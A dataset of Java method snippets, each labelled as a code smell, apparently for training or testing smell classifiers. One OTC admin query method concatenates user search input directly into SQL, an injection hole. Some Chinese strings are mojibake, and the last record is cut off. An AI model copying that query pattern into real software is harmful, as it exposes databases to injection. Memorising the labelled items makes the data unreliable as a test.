"public static Map<String,String> getOptionsKeyNameMap(List<?> setting,String fieldName,Integer label){
  Map<String,String> keyMap=new HashMap<>();
  if (""flowName"".equals(fieldName)) {
    return keyMap;
  }
  String nameKey=getFieldNameKey(fieldName,label);
  if (CollectionUtil.isNotEmpty(setting)) {
    for (    Object o : setting) {
      String jsonStr=StrUtil.toString(o);
      Object name="""";
      if (BaseUtil.isJSON(jsonStr)) {
        Object object=JSON.parse(jsonStr);
        if (object instanceof JSONObject) {
          JSONObject jsonObject=(JSONObject)object;
          if (jsonObject.containsKey(""name"")) {
            name=jsonObject.get(""name"");
          }
          if (jsonObject.containsKey(""type"")) {
            name=jsonObject.get(""value"");
          }
          if (jsonObject.containsKey(""startNumber"")) {
            name=jsonObject.get(""startNumber"");
          }
        }
 else         if (object instanceof JSONArray) {
          JSONArray jsonArray=(JSONArray)object;
          name=jsonArray.get(0);
        }
 else {
          name=object;
        }
      }
 else {
        name=jsonStr;
      }
      keyMap.put(nameKey + ""Options."" + name,StrUtil.toString(name));
    }
  }
  return keyMap;
}",1,Code Smell
"@Override public int eval0(int x,int z,int center,@NonNull int[] v){
  if (center == ID_MUSHROOM_ISLAND) {
    return v[0] != ID_OCEAN && v[1] != ID_OCEAN && v[2] != ID_OCEAN && v[3] != ID_OCEAN ? center : ID_MUSHROOM_ISLAND_SHORE;
  }
  if (isJungle(center)) {
    if (isJungleCompatible(v[0]) && isJungleCompatible(v[1]) && isJungleCompatible(v[2])&& isJungleCompatible(v[3])) {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
    }
 else {
      return ID_JUNGLE_EDGE;
    }
  }
 else   if (center == ID_EXTREME_HILLS || center == ID_EXTREME_HILLS_WITH_TREES || center == ID_EXTREME_HILLS_EDGE) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_STONE_BEACH;
    }
  }
 else   if (isSnowyBiome(center)) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_COLD_BEACH;
    }
  }
 else   if (center == ID_MESA || center == ID_MESA_ROCK) {
    if (!isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3])) {
      return isMesa(v[0]) && isMesa(v[1]) && isMesa(v[2])&& isMesa(v[3]) ? center : ID_DESERT;
    }
 else {
      return center;
    }
  }
 else   if (center == ID_OCEAN || center == ID_DEEP_OCEAN || center == ID_RIVER || center == ID_SWAMPLAND) {
    return center;
  }
 else {
    return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
  }
}",1,Code Smell
"@PostMapping(value=""/challenge/{name}"",params=""action=submit"") @Operation(description=""Post your answer to the challenge for a given challenge"") public String postController(@ModelAttribute ChallengeForm challengeForm,Model model,@PathVariable String name){
  var challengeDefinition=findByShortName(name);
  if (!isChallengeEnabled(challengeDefinition)) {
    model.addAttribute(""answerIncorrect"",""This challenge has been disabled."");
  }
 else {
    var challenge=challenges.findChallenge(name,runtimeEnvironment).orElseThrow(() -> new ChallengeConfigurationException(configError(""Challenge '%s' not found for environment: '%s'"",name,runtimeEnvironment.getRuntimeEnvironment().name())));
    if (challenge.answerCorrect(challengeForm.solution())) {
      scoreCard.completeChallenge(challengeDefinition);
      if (ctfModeEnabled) {
        if (!Strings.isNullOrEmpty(ctfServerAddress) && !ctfServerAddress.equals(""not_set"")) {
          if (challenge instanceof Challenge8) {
            if (!Strings.isNullOrEmpty(keyToProvideToHost) && !keyToProvideToHost.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ keyToProvideToHost);
            }
          }
 else           if (challenge instanceof Challenge30) {
            if (!Strings.isNullOrEmpty(keyToProvideToHostForChallenge30) && !keyToProvideToHostForChallenge30.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ keyToProvideToHostForChallenge30);
            }
          }
 else           if (challenge instanceof Challenge37) {
            if (!Strings.isNullOrEmpty(getKeyToProvideToHostChallenge37) && !keyToProvideToHostForChallenge30.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ getKeyToProvideToHostChallenge37);
            }
          }
 else {
            model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the same answer in the ctf-instance of the app: "" + ctfServerAddress);
          }
        }
 else {
          String code=generateCode(challengeDefinition);
          model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following code in CTF scoring: "" + code);
        }
      }
 else {
        model.addAttribute(""answerCorrect"",""Your answer is correct!"");
      }
    }
 else {
      model.addAttribute(""answerIncorrect"",""Your answer is incorrect, try harder ;-)"");
    }
  }
  addChallengeUI(model,challengeDefinition);
  includeScoringStatus(model,challengeDefinition);
  enrichWithHintsAndReasons(model);
  fireEnding(model);
  return ""challenge"";
}",1,Code Smell
"@Override public void onSizeChanged(int height,boolean isWidthGreater){
  if (!isPremium) {
    return;
  }
  if (height > dp(50) && keyboardVisible && !AndroidUtilities.isInMultiwindow && !AndroidUtilities.isTablet()) {
    if (isWidthGreater) {
      keyboardHeightLand=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height_land3"",keyboardHeightLand).commit();
    }
 else {
      keyboardHeight=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height"",keyboardHeight).commit();
    }
  }
  if (emojiViewVisible) {
    int newHeight=(isWidthGreater ? keyboardHeightLand : keyboardHeight);
    FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)emojiView.getLayoutParams();
    if (layoutParams.width != AndroidUtilities.displaySize.x || layoutParams.height != newHeight) {
      layoutParams.width=AndroidUtilities.displaySize.x;
      layoutParams.height=newHeight;
      emojiView.setLayoutParams(layoutParams);
      emojiPadding=layoutParams.height;
      keyboardNotifier.fire();
      sizeNotifierFrameLayout.requestLayout();
    }
  }
  if (lastSizeChangeValue1 == height && lastSizeChangeValue2 == isWidthGreater) {
    return;
  }
  lastSizeChangeValue1=height;
  lastSizeChangeValue2=isWidthGreater;
  boolean oldValue=keyboardVisible;
  if (currentCell != null) {
    final EditTextBoldCursor editText=currentCell.getEditField();
    keyboardVisible=editText.isFocused() && keyboardNotifier.keyboardVisible() && height > 0;
  }
 else {
    keyboardVisible=false;
  }
  if (keyboardVisible && emojiViewVisible) {
    showEmojiPopup(0);
  }
  if (emojiPadding != 0 && !keyboardVisible && keyboardVisible != oldValue && !emojiViewVisible) {
    emojiPadding=0;
    keyboardNotifier.fire();
    sizeNotifierFrameLayout.requestLayout();
  }
  if (keyboardVisible && waitingForKeyboardOpen) {
    waitingForKeyboardOpen=false;
    AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
  }
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.diceStickersDidLoad) {
    String name=(String)args[0];
    if (INTERACTIONS_STICKER_PACK.equals(name)) {
      checkStickerPack();
    }
  }
 else   if (id == NotificationCenter.onEmojiInteractionsReceived) {
    if (NekoConfig.disableRemoteEmojiInteractions.Bool())     return;
    long dialogId=(long)args[0];
    TLRPC.TL_sendMessageEmojiInteraction action=(TLRPC.TL_sendMessageEmojiInteraction)args[1];
    if (dialogId == this.dialogId && supportedEmoji.contains(action.emoticon)) {
      int messageId=action.msg_id;
      if (action.interaction.data != null) {
        try {
          JSONObject jsonObject=new JSONObject(action.interaction.data);
          JSONArray array=jsonObject.getJSONArray(""a"");
          for (int i=0; i < array.length(); i++) {
            JSONObject actionObject=array.getJSONObject(i);
            int animation=actionObject.optInt(""i"",1) - 1;
            double time=actionObject.optDouble(""t"",0.0);
            AndroidUtilities.runOnUIThread(new Runnable(){
              @Override public void run(){
                findViewAndShowAnimation(messageId,animation);
              }
            }
,(long)(time * 1000));
          }
        }
 catch (        JSONException e) {
          e.printStackTrace();
        }
      }
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    Integer printingType=MessagesController.getInstance(currentAccount).getPrintingStringType(dialogId,threadMsgId);
    if (printingType != null && printingType == 5) {
      cancelHintRunnable();
    }
  }
}",1,Code Smell
"public long procConsumeResult(boolean isFilterConsume){
  long dltTime=System.currentTimeMillis() - this.lastRptTIme;
  return procConsumeResult(isFilterConsume,this.reqProcType,this.errCode,this.msgSize,this.isEscLimit,this.limitDlt,this.curDataDlt,this.isRequireSlow) - dltTime;
}
/** 
 * Process the consume result.
 * @param isFilterConsume if current consume should be filtered
 * @param reqProcType     type information
 * @param errCode         error code
 * @param msgSize         message size
 * @param isReqEscLimit   if the rsplimitDlt is ignored in current consume
 * @param rsplimitDlt     max offset of the current consume
 * @param lastDataDlt     offset of the last data fetch
 * @param isRequireSlow  if the server requires slow down
 * @return message size per minute
 */
public long procConsumeResult(boolean isFilterConsume,int reqProcType,int errCode,int msgSize,boolean isReqEscLimit,long rsplimitDlt,long lastDataDlt,boolean isRequireSlow){
  if (lastDataDlt >= 0) {
    this.lastDataRdDlt=lastDataDlt;
  }
  this.recvMsgSize+=msgSize;
  this.recvMsgInMin+=msgSize;
  long currTime=System.currentTimeMillis();
  checkAndCalcDataLimit(currTime);
  if (errCode != TErrCodeConstants.NOT_FOUND && errCode != TErrCodeConstants.SUCCESS) {
    return rsplimitDlt;
  }
  if (msgSize == 0 && errCode != TErrCodeConstants.SUCCESS) {
    this.totalRcvZeroCount+=1;
  }
 else {
    this.totalRcvZeroCount=0;
  }
  if (this.totalRcvZeroCount > 0) {
    if (this.groupFlowCtrlRuleHandler.getMinZeroCnt() != Integer.MAX_VALUE) {
      return groupFlowCtrlRuleHandler.getCurFreqLimitTime(this.totalRcvZeroCount,(int)rsplimitDlt);
    }
 else {
      return defFlowCtrlRuleHandler.getCurFreqLimitTime(this.totalRcvZeroCount,(int)rsplimitDlt);
    }
  }
  if (isReqEscLimit) {
    return 0;
  }
 else {
    if (this.recvMsgInMin >= this.curFlowCtrlVal.dataLtInSize || this.recvMsgSize >= this.limitMsgInSec) {
      return this.curFlowCtrlVal.freqLtInMs > rsplimitDlt ? this.curFlowCtrlVal.freqLtInMs : rsplimitDlt;
    }
    if (errCode == TErrCodeConstants.SUCCESS) {
      if (isFilterConsume && filterCtrlItem.getFreqLtInMs() >= 0) {
        if (isRequireSlow) {
          return this.filterCtrlItem.getZeroCnt();
        }
 else {
          return this.filterCtrlItem.getFreqLtInMs();
        }
      }
 else       if (!isFilterConsume && filterCtrlItem.getDataLtInSZ() >= 0) {
        return this.filterCtrlItem.getDataLtInSZ();
      }
    }
    return rsplimitDlt;
  }
}",1,Code Smell
"@Override public void render(long positionUs,long elapsedRealtimeUs) throws ExoPlaybackException {
  if (outputStreamEnded) {
    try {
      audioSink.playToEndOfStream();
    }
 catch (    AudioSink.WriteException e) {
      throw ExoPlaybackException.createForRenderer(e,getIndex());
    }
    return;
  }
  if (inputFormat == null) {
    flagsOnlyBuffer.clear();
    int result=readSource(formatHolder,flagsOnlyBuffer,true);
    if (result == C.RESULT_FORMAT_READ) {
      onInputFormatChanged(formatHolder.format);
    }
 else     if (result == C.RESULT_BUFFER_READ) {
      Assertions.checkState(flagsOnlyBuffer.isEndOfStream());
      inputStreamEnded=true;
      processEndOfStream();
      return;
    }
 else {
      return;
    }
  }
  maybeInitDecoder();
  if (decoder != null) {
    try {
      TraceUtil.beginSection(""drainAndFeed"");
      while (drainOutputBuffer()) {
      }
      while (feedInputBuffer()) {
      }
      TraceUtil.endSection();
    }
 catch (    AudioDecoderException|AudioSink.ConfigurationException|AudioSink.InitializationException|AudioSink.WriteException e) {
      throw ExoPlaybackException.createForRenderer(e,getIndex());
    }
    decoderCounters.ensureUpdated();
  }
}
",1,Code Smell
"public void send(int state,boolean notify,int scheduleDate,int ttl){
  if (textureView == null) {
    return;
  }
  stopProgressTimer();
  if (videoPlayer != null) {
    videoPlayer.releasePlayer(true);
    videoPlayer=null;
  }
  if (state == 4) {
    if (videoEncoder != null && recordedTime > 800) {
      videoEncoder.stopRecording(VideoRecorder.ENCODER_SEND_SEND,ttl);
      return;
    }
    if (BuildVars.DEBUG_VERSION && !cameraFile.exists()) {
      FileLog.e(new RuntimeException(""file not found :( round video""));
    }
    if (videoEditedInfo.needConvert()) {
      file=null;
      encryptedFile=null;
      key=null;
      iv=null;
      double totalDuration=videoEditedInfo.estimatedDuration;
      long startTime=videoEditedInfo.startTime >= 0 ? videoEditedInfo.startTime : 0;
      long endTime=videoEditedInfo.endTime >= 0 ? videoEditedInfo.endTime : videoEditedInfo.estimatedDuration;
      videoEditedInfo.estimatedDuration=endTime - startTime;
      videoEditedInfo.estimatedSize=Math.max(1,(long)(size * (videoEditedInfo.estimatedDuration / totalDuration)));
      videoEditedInfo.bitrate=1000000;
      if (videoEditedInfo.startTime > 0) {
        videoEditedInfo.startTime*=1000;
      }
      if (videoEditedInfo.endTime > 0) {
        videoEditedInfo.endTime*=1000;
      }
      FileLoader.getInstance(currentAccount).cancelFileUpload(cameraFile.getAbsolutePath(),false);
    }
 else {
      videoEditedInfo.estimatedSize=Math.max(1,size);
    }
    videoEditedInfo.file=file;
    videoEditedInfo.encryptedFile=encryptedFile;
    videoEditedInfo.key=key;
    videoEditedInfo.iv=iv;
    MediaController.PhotoEntry entry=new MediaController.PhotoEntry(0,0,0,cameraFile.getAbsolutePath(),0,true,0,0,0);
    entry.ttl=ttl;
    delegate.sendMedia(entry,videoEditedInfo,notify,scheduleDate,false);
    if (scheduleDate != 0) {
      startAnimation(false,false);
    }
    MediaController.getInstance().requestAudioFocus(false);
  }
 else {
    cancelled=recordedTime < 800;
    recording=false;
    int reason;
    if (cancelled) {
      reason=4;
    }
 else {
      reason=state == 3 ? 2 : 5;
    }
    if (cameraThread != null) {
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.recordStopped,recordingGuid,reason);
      int send;
      if (cancelled) {
        send=0;
      }
 else       if (state == 3) {
        send=2;
      }
 else {
        send=1;
      }
      saveLastCameraBitmap();
      cameraThread.shutdown(send,ttl);
      cameraThread=null;
    }
    if (cancelled) {
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.audioRecordTooShort,recordingGuid,true,(int)recordedTime);
      startAnimation(false,false);
      MediaController.getInstance().requestAudioFocus(false);
    }
  }
}",1,Code Smell
"@RequiresPermissions(""otc:appeal:page-query"") @PostMapping(""page-query"") @AccessLog(module=AdminModule.OTC,operation=""鍒嗛〉鏌ユ壘鍚庡彴鐢宠瘔Appeal"") public MessageResult pageQuery(PageModel pageModel,AppealScreen screen){
  StringBuilder headSqlBuilder=new StringBuilder(""select a.id appealId,"").append(""b.member_name advertiseCreaterUserName,b.member_real_name advertiseCreaterName,"").append(""b.customer_name customerUserName,b.customer_real_name customerName,"").append(""c.username initiatorUsername,c.real_name initiatorName,"").append(""d.username associateUsername,d.real_name associateName,"").append(""b.commission fee,b.number,b.money,b.order_sn orderSn,b.create_time transactionTime,"").append(""a.create_time createTime,a.deal_with_time dealWithTime,b.pay_mode payMode, e.name coinName,"").append(""b.status orderStatus,a.is_success isSuccess,b.advertise_type advertiseType,a.status,a.remark "");
  StringBuilder countHead=new StringBuilder(""select count(*) "");
  StringBuilder endSql=new StringBuilder(""from appeal a,otc_order b,member c,member d,otc_coin e"").append("" where a.order_id = b.id and a.initiator_id = c.id and a.associate_id = d.id "").append("" and b.coin_id = e.id and b.status != 0 "");
  if (!StringUtils.isEmpty(screen.getNegotiant())) {
    endSql.append("" and (b.customer_name like '%"" + screen.getNegotiant() + ""%'"").append("" or b.customer_real_name like '%"" + screen.getNegotiant() + ""%')"");
  }
  if (!StringUtils.isEmpty(screen.getComplainant())) {
    endSql.append("" and (b.member_name like '%"" + screen.getComplainant() + ""%'"").append("" or b.member_real_name like '%"" + screen.getComplainant() + ""%')"");
  }
  if (screen.getAdvertiseType() != null) {
    endSql.append("" and b.advertise_type = "" + screen.getAdvertiseType().getOrdinal() + "" "");
  }
  if (screen.getSuccess() != null) {
    endSql.append("" and (a.is_success = "" + screen.getSuccess().getOrdinal() + "" and a.deal_with_time is not null) "");
  }
 else {
    if (screen.getAuditing()) {
      endSql.append("" and a.is_success is null "");
    }
  }
  if (!StringUtils.isEmpty(screen.getUnit())) {
    endSql.append("" and lower(e.unit) = '"" + screen.getUnit().toLowerCase() + ""'"");
  }
  if (screen.getStatus() != null && screen.getStatus().getOrdinal() != 0) {
    endSql.append("" and b.status = "" + screen.getStatus().getOrdinal());
  }
  Page page=appealService.createNativePageQuery(countHead.append(endSql),headSqlBuilder.append(endSql),pageModel,Transformers.ALIAS_TO_ENTITY_MAP);
  return success(""鑾峰彇鎴愬姛"",page);
}",1,Code Smell
"private void createNewTable(TiDBExpressionGenerator gen,StringBuilder sb){
  sb.append(""("");
  for (int i=0; i < columns.size(); i++) {
    if (i != 0) {
      sb.append("", "");
    }
    sb.append(columns.get(i).getName());
    sb.append("" "");
    TiDBCompositeDataType type;
    type=TiDBCompositeDataType.getRandom();
    appendType(sb,type);
    sb.append("" "");
    boolean isGeneratedColumn=Randomly.getBooleanWithRatherLowProbability();
    if (isGeneratedColumn) {
      sb.append("" AS ("");
      sb.append(TiDBVisitor.asString(gen.generateExpression()));
      sb.append("") "");
      sb.append(Randomly.fromOptions(""STORED"",""VIRTUAL""));
      sb.append("" "");
      errors.add(""Generated column can refer only to generated columns defined prior to it"");
      errors.add(""'Defining a virtual generated column as primary key' is not supported for generated columns."");
      errors.add(""contains a disallowed function."");
      errors.add(""cannot refer to auto-increment column"");
    }
    if (Randomly.getBooleanWithRatherLowProbability()) {
      sb.append(""CHECK ("");
      sb.append(TiDBVisitor.asString(gen.generateExpression()));
      sb.append("") "");
    }
    if (Randomly.getBooleanWithRatherLowProbability()) {
      sb.append(""NOT NULL "");
    }
    if (Randomly.getBoolean() && type.getPrimitiveDataType().canHaveDefault() && !isGeneratedColumn) {
      sb.append(""DEFAULT "");
      sb.append(TiDBVisitor.asString(gen.generateConstant(type.getPrimitiveDataType())));
      sb.append("" "");
      errors.add(""Invalid default value"");
      errors.add(""All parts of a PRIMARY KEY must be NOT NULL; if you need NULL in a key, use UNIQUE instead"");
    }
    if (type.getPrimitiveDataType() == TiDBDataType.INT && Randomly.getBooleanWithRatherLowProbability() && !isGeneratedColumn) {
      sb.append("" AUTO_INCREMENT "");
      errors.add(""there can be only one auto column and it must be defined as a key"");
    }
    if (Randomly.getBooleanWithRatherLowProbability() && canUseAsUnique(type)) {
      sb.append(""UNIQUE "");
    }
    if (Randomly.getBooleanWithRatherLowProbability() && allowPrimaryKey && !primaryKeyAsTableConstraints&& canUseAsUnique(type)&& !isGeneratedColumn) {
      sb.append(""PRIMARY KEY "");
      allowPrimaryKey=false;
    }
  }
  if (primaryKeyAsTableConstraints) {
    sb.append("", PRIMARY KEY("");
    sb.append(Randomly.nonEmptySubset(columns).stream().map(c -> c.getName()).collect(Collectors.joining("", "")));
    sb.append("")"");
    errors.add("" used in key specification without a key length"");
  }
  sb.append("")"");
  if (Randomly.getBooleanWithRatherLowProbability()) {
    sb.append(""PARTITION BY HASH("");
    sb.append(TiDBVisitor.asString(gen.generateExpression()));
    sb.append("") "");
    sb.append(""PARTITIONS "");
    sb.append(Randomly.getNotCachedInteger(1,100));
    errors.add(""Constant, random or timezone-dependent expressions in (sub)partitioning function are not allowed"");
    errors.add(""This partition function is not allowed"");
    errors.add(""A PRIMARY KEY must include all columns in the table's partitioning function"");
    errors.add(""A UNIQUE INDEX must include all columns in the table's partitioning function"");
    errors.add(""is of a not allowed type for this type of partitioning"");
    errors.add(""The PARTITION function returns the wrong type"");
  }
}",1,Code Smell
"private void processBoostDialog(Long peerId,Runnable dismissLoading,Browser.Progress progress){
  processBoostDialog(peerId,dismissLoading,progress,null);
}
private void processBoostDialog(Long peerId,Runnable dismissLoading,Browser.Progress progress,ChatMessageCell chatMessageCell){
  ChannelBoostsController boostsController=MessagesController.getInstance(currentAccount).getBoostsController();
  if (progress != null) {
    progress.init();
  }
  boostsController.getBoostsStats(peerId,boostsStatus -> {
    if (boostsStatus == null) {
      if (progress != null) {
        progress.end();
      }
      if (dismissLoading != null) {
        dismissLoading.run();
      }
      return;
    }
    boostsController.userCanBoostChannel(peerId,boostsStatus,canApplyBoost -> {
      if (progress != null) {
        progress.end();
      }
      BaseFragment lastFragment=getLastFragment();
      if (lastFragment == null) {
        return;
      }
      Theme.ResourcesProvider resourcesProvider=lastFragment.getResourceProvider();
      if (lastFragment.getLastStoryViewer() != null && lastFragment.getLastStoryViewer().isFullyVisible()) {
        resourcesProvider=lastFragment.getLastStoryViewer().getResourceProvider();
      }
      LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(lastFragment,this,TYPE_BOOSTS_FOR_USERS,currentAccount,resourcesProvider);
      limitReachedBottomSheet.setCanApplyBoost(canApplyBoost);
      boolean isCurrentChat=false;
      if (lastFragment instanceof ChatActivity) {
        isCurrentChat=((ChatActivity)lastFragment).getDialogId() == peerId;
      }
 else       if (lastFragment instanceof DialogsActivity) {
        DialogsActivity dialogsActivity=((DialogsActivity)lastFragment);
        isCurrentChat=dialogsActivity.rightSlidingDialogContainer != null && dialogsActivity.rightSlidingDialogContainer.getCurrentFragmetDialogId() == peerId;
      }
      limitReachedBottomSheet.setBoostsStats(boostsStatus,isCurrentChat);
      limitReachedBottomSheet.setDialogId(peerId);
      limitReachedBottomSheet.setChatMessageCell(chatMessageCell);
      lastFragment.showDialog(limitReachedBottomSheet);
      try {
        if (dismissLoading != null) {
          dismissLoading.run();
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
);
  }
);
}
",1,Code Smell
"public void set(TL_stories.StoryItem storyItem,EmojiAnimationsOverlay animationsOverlay){
  ArrayList<TL_stories.MediaArea> mediaAreas=storyItem != null ? storyItem.media_areas : null;
  set(storyItem,mediaAreas,animationsOverlay);
}
public void set(TL_stories.StoryItem storyItem,ArrayList<TL_stories.MediaArea> mediaAreas,EmojiAnimationsOverlay animationsOverlay){
  if (mediaAreas == lastMediaAreas && (mediaAreas == null || lastMediaAreas == null || mediaAreas.size() == lastMediaAreas.size())) {
    return;
  }
  if (hintView != null) {
    hintView.hide();
    hintView=null;
  }
  for (int i=0; i < getChildCount(); ++i) {
    View child=getChildAt(i);
    if (child != hintsContainer) {
      removeView(child);
      i--;
    }
  }
  selectedArea=null;
  parentHighlightScaleAlpha.set(0,true);
  invalidate();
  onHintVisible(false);
  malicious=false;
  lastMediaAreas=mediaAreas;
  if (mediaAreas == null) {
    return;
  }
  shined=false;
  final float W=1080, H=1920;
  double totalArea=0;
  for (int i=0; i < mediaAreas.size(); ++i) {
    TL_stories.MediaArea mediaArea=mediaAreas.get(i);
    if (mediaArea != null && mediaArea.coordinates != null) {
      View areaView;
      if (mediaArea instanceof TL_stories.TL_mediaAreaSuggestedReaction) {
        StoryReactionWidgetView storyReactionWidgetView=new StoryReactionWidgetView(getContext(),this,(TL_stories.TL_mediaAreaSuggestedReaction)mediaArea,animationsOverlay);
        areaView=storyReactionWidgetView;
        if (storyItem != null) {
          storyReactionWidgetView.setViews(storyItem.views,false);
        }
        ScaleStateListAnimator.apply(areaView);
      }
 else {
        areaView=new AreaView(getContext(),parentView,mediaArea);
      }
      areaView.setOnClickListener(this);
      addView(areaView);
      totalArea+=(mediaArea.coordinates.w / 100f * W) * (mediaArea.coordinates.h / 100f * H);
    }
  }
  malicious=false;
  hintsContainer.bringToFront();
}",1,Code Smell
"/** 
 * 鑾峰彇鍏虫敞鐨勭敤鎴蜂俊鎭�
 * @param followSearchDTO
 * @param currentUser
 * @return
 */
@Override public PageInfo<FollowDTO> getFollowUsers(FollowSearchDTO followSearchDTO,UserSsoDTO currentUser){
  Long getBigCow=followSearchDTO.getGetBigCow();
  Long getFan=followSearchDTO.getGetFan();
  if (getBigCow == null && getFan == null) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  if (getBigCow != null && getFan != null) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  FollowPoExample example=new FollowPoExample();
  FollowPoExample.Criteria criteria=example.createCriteria().andStateEqualTo(true);
  if (getBigCow != null) {
    criteria.andFromUserEqualTo(getBigCow);
  }
  if (getFan != null) {
    criteria.andToUserEqualTo(getFan);
  }
  example.setOrderByClause(""`id` desc"");
  PageHelper.startPage(followSearchDTO.getCurrentPage(),followSearchDTO.getPageSize());
  List<FollowPo> followPos=followPoMapper.selectByExample(example);
  PageInfo<FollowDTO> pageInfo=FollowMS.INSTANCE.toPage(new PageInfo<>(followPos));
  pageInfo.getList().forEach(followDTO -> {
    UserDTO userDTO=new UserDTO();
    if (getBigCow != null) {
      userDTO=userService.getById(followDTO.getToUser());
    }
    if (getFan != null) {
      userDTO=userService.getById(followDTO.getFromUser());
    }
    followDTO.setName(userDTO.getName());
    followDTO.setPicture(userDTO.getPicture());
    followDTO.setIntro(userDTO.getIntro());
    followDTO.setLevel(userlevelService.getByUserId(userDTO.getId()).get(0).getLevel());
    followDTO.setLikeCount(likeService.getUserLikeCount(userDTO.getId()));
    List<ArticleReadDTO> articleReadDTOS=articleService.getUserReadCount(Collections.singletonList(userDTO.getId()));
    followDTO.setReadCount(CollectionUtils.isEmpty(articleReadDTOS) ? 0L : articleReadDTOS.get(0).getArticleReadCount());
    if (currentUser != null) {
      FollowDTO followed=getByFromToUser(currentUser.getUserId(),userDTO.getId(),false);
      if (followed != null) {
        followDTO.setIsFollow(true);
      }
    }
  }
);
  return pageInfo;
}",1,Code Smell
"void setState(@State int state){
  setState(state,true);
}
private void setState(@State int state,boolean animation){
  if (null == mSearchBar || null == mSearchBarMover || null == mViewTransition || null == mSearchLayout) {
    return;
  }
  if (mState != state) {
    int oldState=mState;
    mState=state;
switch (oldState) {
case STATE_NORMAL:
      if (state == STATE_SIMPLE_SEARCH) {
        mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
 else       if (state == STATE_SEARCH) {
        mViewTransition.showView(1,animation);
        mSearchLayout.scrollSearchContainerToTop();
        mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
 else       if (state == STATE_SEARCH_SHOW_LIST) {
        mViewTransition.showView(1,animation);
        mSearchLayout.scrollSearchContainerToTop();
        mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
    break;
case STATE_SIMPLE_SEARCH:
  if (state == STATE_NORMAL) {
    mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
    mSearchBarMover.returnSearchBarPosition();
    selectActionFab(animation);
  }
 else   if (state == STATE_SEARCH) {
    mViewTransition.showView(1,animation);
    mSearchLayout.scrollSearchContainerToTop();
    mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
    mSearchBarMover.returnSearchBarPosition();
  }
 else   if (state == STATE_SEARCH_SHOW_LIST) {
    mViewTransition.showView(1,animation);
    mSearchLayout.scrollSearchContainerToTop();
    mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
    mSearchBarMover.returnSearchBarPosition();
  }
break;
case STATE_SEARCH:
if (state == STATE_NORMAL) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
mSearchBarMover.returnSearchBarPosition();
selectActionFab(animation);
}
 else if (state == STATE_SIMPLE_SEARCH) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
 else if (state == STATE_SEARCH_SHOW_LIST) {
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
break;
case STATE_SEARCH_SHOW_LIST:
if (state == STATE_NORMAL) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
mSearchBarMover.returnSearchBarPosition();
selectActionFab(animation);
}
 else if (state == STATE_SIMPLE_SEARCH) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
 else if (state == STATE_SEARCH) {
mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
mSearchBarMover.returnSearchBarPosition();
}
break;
}
}
}",1,Code Smell
"@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  int type=holder.getItemViewType();
  if (type == 4) {
    StickerCell stickerCell=(StickerCell)holder.itemView;
    StickerResult result=stickers.get(position);
    stickerCell.setSticker(result.sticker,result.parent);
    stickerCell.setClearsInputField(true);
  }
 else   if (type == 3) {
    TextView textView=(TextView)holder.itemView;
    TLRPC.Chat chat=parentFragment.getCurrentChat();
    if (chat != null) {
      if (!ChatObject.hasAdminRights(chat) && chat.default_banned_rights != null && chat.default_banned_rights.send_inline) {
